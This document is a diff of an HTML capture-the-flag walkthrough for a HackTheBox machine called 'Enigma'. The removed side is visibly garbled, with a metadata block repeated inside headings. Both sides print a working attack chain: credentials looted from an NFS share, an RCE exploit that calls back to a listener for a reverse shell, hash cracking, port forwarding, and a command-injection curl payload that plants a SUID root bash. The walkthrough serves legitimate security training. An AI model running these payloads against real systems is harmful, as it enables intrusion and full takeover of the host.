@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Enigma — HackTheBox Writeup • HTB Writeup</title>
+    <title>Enigma • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,23 +25,7 @@
             padding: 3rem;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1.5rem;
-        }
-        .meta-info {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem 2rem;
-            padding: 1rem;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 1rem;
-            margin-bottom: 2rem;
-        }
-        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
-        .meta-info strong { color: #e0e5f0; }
-        
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
         h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
         h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
         h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
@@ -49,477 +33,207 @@
         code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
         pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
         pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
         .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
         .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
         .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
         .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
-        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
         table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
         table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
         table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
         ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
         ul li { margin-bottom: 0.5rem; line-height: 1.6; }
-        
-        .ascii-art {
-            text-align: center;
-            opacity: 0.3;
-            font-size: 0.5rem;
-            line-height: 1.2;
-            color: #6fffe0;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-        }
+        .cve-tag { display: inline-block; background: rgba(255, 0, 0, 0.15); color: #ff6666; padding: 0.2rem 0.8rem; border-radius: 20px; font-size: 0.8rem; font-weight: 600; margin-right: 0.5rem; }
         .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
         .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
         .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
         .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
         .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
-        
-        .cve-tag {
-            display: inline-block;
-            background: rgba(255, 0, 0, 0.15);
-            color: #ff6666;
-            padding: 0.2rem 0.8rem;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            margin-right: 0.5rem;
-        }
-        .highlight {
-            background: rgba(0, 255, 200, 0.05);
-            border: 1px solid rgba(0, 255, 200, 0.1);
-            border-radius: 0.5rem;
-            padding: 0.5rem 1rem;
-            margin: 0.5rem 0;
-        }
-        .attack-chain {
-            background: rgba(0, 255, 200, 0.02);
-            border: 1px solid rgba(0, 255, 200, 0.1);
-            border-radius: 1rem;
-            padding: 1.5rem;
-            margin: 1rem 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
-            color: #b6c8e0;
-            line-height: 1.8;
-            overflow-x: auto;
-        }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    
     <div class="meta-info">
         <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+        <span><strong>Difficulty:</strong> Easy</span>
+        <span><strong>OS:</strong> Linux</span>
+        <span><strong>Domain:</strong> enigma.htb</span>
+        <span><strong>Tech Stack:</strong> nginx, Dovecot, NFS, OpenSTAManager 2.9.8, OliveTin, MySQL</span>
     </div>
-Enigma — HackTheBox Writeup</h1>
 
-<p><strong>Platform:</strong> HackTheBox  </p>
-<p><strong>Difficulty:</strong> Easy  </p>
-<p><strong>OS:</strong> Linux  </p>
-<p><strong>IP:</strong> <code>$TARGET</code>  </p>
-<p><strong>Domain:</strong> <code>enigma.htb</code>, <code>mail001.enigma.htb</code>, <code>support_001.enigma.htb</code>  </p>
-<p><strong>Tech Stack:</strong> nginx, Dovecot (IMAP/POP3), NFS, OpenSTAManager 2.9.8, OliveTin, MySQL</p>
+    <h1>🚀 HTB Enigma - Complete Walkthrough</h1>
 
-<hr />
-
-<div class="attack-chain"><pre>## Attack Chain Overview
-
-```</pre></div>
-<p>NFS onboarding share</p>
-<p>   → PDF with kevin:Enigma2024! credentials</p>
-<p>   → Webmail credential pivot to sarah</p>
-<p>   → IT email leaks support portal creds</p>
-<p>   → OpenSTAManager RCE (CVE-2026-38751) → www-data shell</p>
-<p>   → MySQL config → bcrypt hash → hashcat → su haris</p>
-<p>   → OliveTin password-type injection (CVE-2026-27626) → RCE as root</p>
-<p>   → SUID bash copy → root</p>
-<pre><code>
----
-
-## Table of Contents
-
-1. [Reconnaissance](#1-reconnaissance)
-2. [NFS Share Enumeration](#2-nfs-share-enumeration)
-3. [Webmail Credential Pivot](#3-webmail-credential-pivot)
-4. [OpenSTAManager RCE — CVE-2026-38751](#4-openstamanager-rce--cve-2026-38751)
-5. [Linux Enumeration](#5-linux-enumeration)
-6. [Hash Extraction and Cracking](#6-hash-extraction-and-cracking)
-7. [Lateral Movement — su haris](#7-lateral-movement--su-haris)
-8. [Privilege Escalation — OliveTin CVE-2026-27626](#8-privilege-escalation--olivetin-cve-2026-27626)
-9. [Root Flag](#9-root-flag)
-10. [Key Takeaways](#10-key-takeaways)
-
----
-
-## 1. Reconnaissance
-</code></pre>
-<p>nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent</p>
-<p>nmap -sVC -p22,80,110,111,143,993,995,2049,36815,41307,42337,42629,51951 $TARGET -oN service</p>
-<pre><code>
-Key services identified:
-
-| Port | Service | Notes |
-|------|---------|-------|
-| 22 | SSH | OpenSSH 9.6p1 |
-| 80 | HTTP | nginx 1.24.0 |
-| 110/995 | POP3 | Dovecot |
-| 143/993 | IMAP | Dovecot |
-| 111/2049 | RPC/NFS | NFS share exposed |
-
-The presence of ports 111 and 2049 immediately signals an NFS share — always check for credential files or sensitive documents when an NFS export is accessible without auth.
-
-Related notes: [nmap](../../../tools/recon/nmap.md), [showmount](../../../tools/recon/showmount.md)
-
----
-
-## 2. NFS Share Enumeration
-</code></pre>
-<p>showmount -e $TARGET</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <h2>📋 Attack Chain Overview</h2>
+    <div class="attack-chain">
+        <pre>NFS onboarding share
+   → PDF with kevin:Enigma2024! credentials
+   → Webmail credential pivot to sarah
+   → IT email leaks support portal creds
+   → OpenSTAManager RCE (CVE-2026-38751) → www-data shell
+   → MySQL config → bcrypt hash → hashcat → su haris
+   → OliveTin password-type injection (CVE-2026-27626) → RCE as root
+   → SUID bash copy → root</pre>
     </div>
-Output: /srv/nfs/onboarding</h1>
-<pre><code>
-The export path `/srv/nfs/onboarding` hints at employee onboarding material — exactly the kind of share that leaks first-day credentials.
-</code></pre>
-<p>mkdir /tmp/nfs_mount</p>
-<p>sudo mount -t nfs $TARGET:/srv/nfs/onboarding /tmp/nfs_mount</p>
-<p>ls -la /tmp/nfs_mount</p>
-<pre><code>
-Inside the mount: a PDF for a new employee containing plaintext credentials:
-</code></pre>
-<p>Employee:  Kevin Mitchell</p>
-<p>URL:       http://mail001.enigma.htb</p>
-<p>Username:  kevin</p>
-<p>Password:  Enigma2024!</p>
-<pre><code>
-Add vhosts to `/etc/hosts`:
-</code></pre>
-<p>echo "$TARGET enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts</p>
-<pre><code>
-Full technique: [nfs-share-abuse](../../../exploits/network-services/nfs-share-abuse.md)
 
----
+    <h2>🔍 Reconnaissance</h2>
 
-## 3. Webmail Credential Pivot
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
+nmap -sVC -p22,80,110,111,143,993,995,2049,36815,41307,42337,42629,51951 $TARGET -oN service</code></pre>
 
-Logged into `http://mail001.enigma.htb` as `kevin:Enigma2024!`. Kevin's inbox had an email addressed to `sarah`. Tried the same password for sarah — it worked (credential reuse between the same org).
+    <p>Key services identified:</p>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+        <tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1</td></tr>
+        <tr><td>80</td><td>HTTP</td><td>nginx 1.24.0</td></tr>
+        <tr><td>110/995</td><td>POP3</td><td>Dovecot</td></tr>
+        <tr><td>143/993</td><td>IMAP</td><td>Dovecot</td></tr>
+        <tr><td>111/2049</td><td>RPC/NFS</td><td>NFS share exposed</td></tr>
+    </table>
 
-Sarah's inbox had a message from IT Support with the support portal URL:
-</code></pre>
-<p>URL:      http://support_001.enigma.htb</p>
-<p>Username: admin</p>
-<p>Password: Ne3s4rtars78s</p>
-<pre><code>
-**Why this mattered:** IMAP/webmail is routinely overlooked during initial enumeration. When multiple mail users share a password and you can enumerate usernames from email headers, credential spraying across all visible mailboxes is always worth trying.
+    <h2>📂 NFS Share Enumeration</h2>
 
----
+    <pre><code>showmount -e $TARGET
+# /srv/nfs/onboarding</code></pre>
 
-## 4. OpenSTAManager RCE — CVE-2026-38751
+    <pre><code>mkdir /tmp/nfs_mount
+sudo mount -t nfs $TARGET:/srv/nfs/onboarding /tmp/nfs_mount
+ls -la /tmp/nfs_mount</code></pre>
 
-The support portal at `http://support_001.enigma.htb` ran **OpenSTAManager v2.9.8**. Version confirmed at:
-</code></pre>
-<p>http://support_001.enigma.htb/modules/utenti/info.php</p>
-<pre><code>
-Exploited with a public PoC:
-</code></pre>
-<p>git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751</p>
-<p>cd OpenSTAManager-RCE-Exploit-CVE-2026-38751</p>
-<p>cargo build --release</p>
+    <p>Inside the mount, a PDF for a new employee contains plaintext credentials:</p>
 
-<p>./openstamanager-rce-exploit \</p>
-<p>  --url http://support_001.enigma.htb \</p>
-<p>  -U admin -P Ne3s4rtars78s \</p>
-<p>  --lhost 10.10.15.26 --lport 4444</p>
-<pre><code>
-Reverse shell received as `www-data`. Stabilized:
-</code></pre>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <div class="box success">
+        <pre><code>Employee:  Kevin Mitchell
+URL:       http://mail001.enigma.htb
+Username:  kevin
+Password:  Enigma2024!</code></pre>
     </div>
-Ctrl+Z</h1>
-<p>stty raw -echo; fg</p>
-<h1>Enigma — HackTheBox Writeup</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <pre><code>echo "$TARGET enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h2>📧 Webmail Credential Pivot</h2>
+
+    <p>Logged into <code>http://mail001.enigma.htb</code> as <code>kevin:Enigma2024!</code>. Tried same password for <code>sarah</code> — it worked.</p>
+
+    <p>Sarah's inbox contained a message from IT Support with the support portal URL:</p>
+
+    <div class="box success">
+        <pre><code>URL:      http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s</code></pre>
     </div>
-When prompted for terminal type:</h1>
-<p>export TERM=xterm SHELL=bash</p>
-<pre><code>
-Full technique: [openstamanager-rce-cve-2026-38751](../../../exploits/web-rce/openstamanager-rce-cve-2026-38751.md)
 
----
+    <h2>💻 OpenSTAManager RCE — CVE-2026-38751</h2>
 
-## 5. Linux Enumeration
-</code></pre>
-<p>cat /etc/passwd | grep bash</p>
-<h1>Enigma — HackTheBox Writeup</h1>
+    <p><span class="cve-tag">CVE-2026-38751</span> OpenSTAManager v2.9.8</p>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <pre><code>git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751
+cd OpenSTAManager-RCE-Exploit-CVE-2026-38751
+cargo build --release
+
+./openstamanager-rce-exploit \
+  --url http://support_001.enigma.htb \
+  -U admin -P Ne3s4rtars78s \
+  --lhost 10.10.15.26 --lport 4444</code></pre>
+
+    <p>Reverse shell received as <code>www-data</code>. Stabilized:</p>
+
+    <pre><code># Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm SHELL=bash</code></pre>
+
+    <h2>🔑 Hash Extraction and Cracking</h2>
+
+    <p>Application config file contained database credentials:</p>
+
+    <pre><code>cat config.inc.php
+# $db_username = 'brollin'
+# $db_password = 'Fri3nds@9099'
+# $db_name = 'openstamanager'</code></pre>
+
+    <p>Logged into MySQL and extracted <code>haris</code>'s bcrypt hash:</p>
+
+    <pre><code>mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager
+SELECT username, password FROM zz_users WHERE username = 'haris';
+# $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</code></pre>
+
+    <p>Cracked with hashcat (mode 3200):</p>
+
+    <pre><code>echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash_haris.txt
+hashcat -m 3200 -a 0 hash_haris.txt /usr/share/wordlists/rockyou.txt --force</code></pre>
+
+    <div class="box success">
+        <pre><code>Result: bestfriends</code></pre>
     </div>
-haris:x:1000:1000:...:/home/haris:/bin/bash</h1>
-<pre><code>
-Found the application config file with database credentials:
-</code></pre>
-<p>cat config.inc.php</p>
-<h1>Enigma — HackTheBox Writeup</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <h2>🚶 Lateral Movement — su haris</h2>
+
+    <p>SSH was restricted to key-based auth. Switched user directly from the www-data shell:</p>
+
+    <pre><code>su haris
+# password: bestfriends
+cat /home/haris/user.txt</code></pre>
+
+    <div class="box success">
+        <pre><code>User flag captured.</code></pre>
     </div>
-$db_username = 'brollin'</h1>
-<h1>Enigma — HackTheBox Writeup</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <h2>👑 Privilege Escalation — OliveTin CVE-2026-27626</h2>
+
+    <p><span class="cve-tag">CVE-2026-27626</span> OliveTin OS Command Injection</p>
+
+    <p>OliveTin was running as <strong>root</strong> on <code>127.0.0.1:1337</code>. We used Chisel to forward the port:</p>
+
+    <pre><code># Attacker machine
+chisel server -p 8888 --reverse
+
+# Target machine (from haris shell)
+./chisel client 10.10.15.26:8888 R:1337:127.0.0.1:1337</code></pre>
+
+    <p>The vulnerable action <code>Backup Database</code> had a <code>db_pass</code> argument of type <code>password</code>, which bypasses safety checks. Injected a payload to create a SUID bash:</p>
+
+    <pre><code>curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
+  -H "Content-Type: application/json" \
+  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000005"}'</code></pre>
+
+    <div class="box success">
+        <pre><code>/tmp/rootbash -p
+# rootbash-5.2# id
+# uid=1000(haris) gid=1000(haris) euid=0(root) egid=0(root)</code></pre>
     </div>
-$db_password = 'Fri3nds@9099'</h1>
-<h1>Enigma — HackTheBox Writeup</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
+    <h2>🏁 Root Flag</h2>
+
+    <pre><code>cat /root/root.txt</code></pre>
+
+    <div class="box success">
+        <pre><code>Root flag captured.</code></pre>
     </div>
-$db_name = 'openstamanager'</h1>
-<pre><code>
-Web application config files (especially `config.inc.php`, `config.php`, `.env`, `wp-config.php`) almost always contain DB credentials. Always cat them early.
 
----
+    <h2>📊 Key Takeaways</h2>
+    <ul>
+        <li><strong>NFS onboarding shares leak credentials.</strong> Always enumerate ports 111/2049 and mount exports.</li>
+        <li><strong>Credential reuse is rampant.</strong> Try the same password on every account/service.</li>
+        <li><strong>Internal services often run as root.</strong> Enumerate internal ports with <code>ss -tulpn</code>.</li>
+        <li><strong>Argument type ≠ validation.</strong> OliveTin's <code>password</code> type skipped safety checks.</li>
+        <li><strong>SUID bash is a reliable out.</strong> <code>cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash</code>.</li>
+    </ul>
 
-## 6. Hash Extraction and Cracking
+    <h2>📝 CVEs</h2>
+    <table>
+        <tr><th>CVE</th><th>Application</th><th>Description</th></tr>
+        <tr><td>CVE-2026-38751</td><td>OpenSTAManager 2.9.8</td><td>Authenticated RCE</td></tr>
+        <tr><td>CVE-2026-27626</td><td>OliveTin</td><td>OS Command Injection via password argument type</td></tr>
+    </table>
 
-Logged into MySQL with the recovered credentials and extracted `haris`'s bcrypt hash:
-</code></pre>
-<p>mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager</p>
-<p>SELECT username, password FROM zz_users WHERE username = 'haris';</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</h1>
-<pre><code>
-Saved and cracked with hashcat (mode 3200 = bcrypt):
-</code></pre>
-<p>echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash_haris.txt</p>
-<p>hashcat -m 3200 -a 0 hash_haris.txt /usr/share/wordlists/rockyou.txt --force</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-Result: bestfriends</h1>
-<pre><code>
-Related notes: [mysql](../../../tools/database/mysql.md), [hashcat](../../../tools/creds/hashcat.md)
-
----
-
-## 7. Lateral Movement — su haris
-
-SSH was restricted to key-based auth only. Switched user directly from the www-data shell:
-</code></pre>
-<p>su haris</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-password: bestfriends</h1>
-<p>cat /home/haris/user.txt</p>
-<pre><code>
-**User flag captured.**
-
----
-
-## 8. Privilege Escalation — OliveTin CVE-2026-27626
-
-### Discovery
-</code></pre>
-<p>ls /opt/OliveTin/</p>
-<p>ps aux | grep -i olive</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-root  1520  /usr/local/bin/OliveTin</h1>
-<pre><code>
-OliveTin was running as **root** on `127.0.0.1:1337`. The real config was at `/etc/OliveTin/config.yaml`.
-
-### Port Forwarding with Chisel
-
-To access the OliveTin web UI from the attacker machine:
-</code></pre>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-Attacker machine</h1>
-<p>chisel server -p 8888 --reverse</p>
-
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-Target machine (from haris shell)</h1>
-<p>./chisel client 10.10.15.26:8888 R:1337:127.0.0.1:1337</p>
-<pre><code>
-Browsed to `http://127.0.0.1:1337` on the attacker machine.
-
-Related notes: [chisel](../../../tools/pivot/chisel.md)
-
-### Identifying the Vulnerable Action
-
-Using browser DevTools → Network tab, we found the `Backup Database` action config:
-</code></pre>
-<p>  id: backup_database</p>
-<p>  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"</p>
-<p>  arguments:</p>
-<p>      type: ascii_identifier</p>
-<p>      type: password      # <-- NOT validated by checkShellArgumentSafety</p>
-<p>      type: ascii_identifier</p>
-<pre><code>
-The argument `db_pass` has type `password`. Per **CVE-2026-27626**, OliveTin's `checkShellArgumentSafety` function does not validate arguments of type `password`, allowing shell metacharacter injection.
-
-### API Discovery
-
-OliveTin uses a **gRPC/Connect** protocol — not plain REST. The endpoint discovered via DevTools:
-</code></pre>
-<p>POST /api/olivetin.api.v1.OliveTinApiService/StartAction</p>
-<pre><code>
-A `uniqueTrackingId` field is also required; without it the server returns `notfound`.
-
-### RCE Verification
-
-The injection payload closes the single-quoted password argument (`'`), appends arbitrary commands, then comments out the rest with `#`:
-</code></pre>
-<p>curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \</p>
-<p>  -H "Content-Type: application/json" \</p>
-<p>  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; id > /tmp/rce_test #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000003"}'</p>
-<ul>
-<li>title: Backup Database</li>
-<li>name: db_user</li>
-<li>name: db_pass</li>
-<li>name: db_name</li>
-</ul>
-
-<p>cat /tmp/rce_test</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-uid=0(root) gid=0(root) groups=0(root)</h1>
-<pre><code>
-The resulting executed shell command is:
-</code></pre>
-<p>mysqldump -u backup_svc -p''; id > /tmp/rce_test #' production > /opt/backups/backup.sql</p>
-<pre><code>
-### Root Shell via SUID Bash
-
-Outbound connections were blocked by a firewall. Instead, copied bash with the SUID bit set so any user can spawn a root shell:
-</code></pre>
-<p>curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \</p>
-<p>  -H "Content-Type: application/json" \</p>
-<p>  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000005"}'</p>
-<pre><code></code></pre>
-<p>ls -la /tmp/rootbash</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
--rwsr-xr-x 1 root root ... /tmp/rootbash</h1>
-
-<p>/tmp/rootbash -p</p>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-rootbash-5.2# id</h1>
-<h1>Enigma — HackTheBox Writeup</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> Enigma</span>
-        <span><strong>Difficulty:</strong> Medium</span>
-        <span><strong>Target Ports:</strong> 111</span>
-        <span><strong>OS:</strong> Command</span>
-    </div>
-uid=1000(haris) gid=1000(haris) euid=0(root) egid=0(root)</h1>
-<pre><code>
-Full technique: [olivetin-cmd-injection-cve-2026-27626](../../../exploits/web-rce/olivetin-cmd-injection-cve-2026-27626.md)
-
----
-
-## 9. Root Flag
-</code></pre>
-<p>cat /root/root.txt</p>
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
     </div>
     <div class="footer">NIGHT PULSE X • 2026</div>
 </div>
-
 </body>
 </html>
+
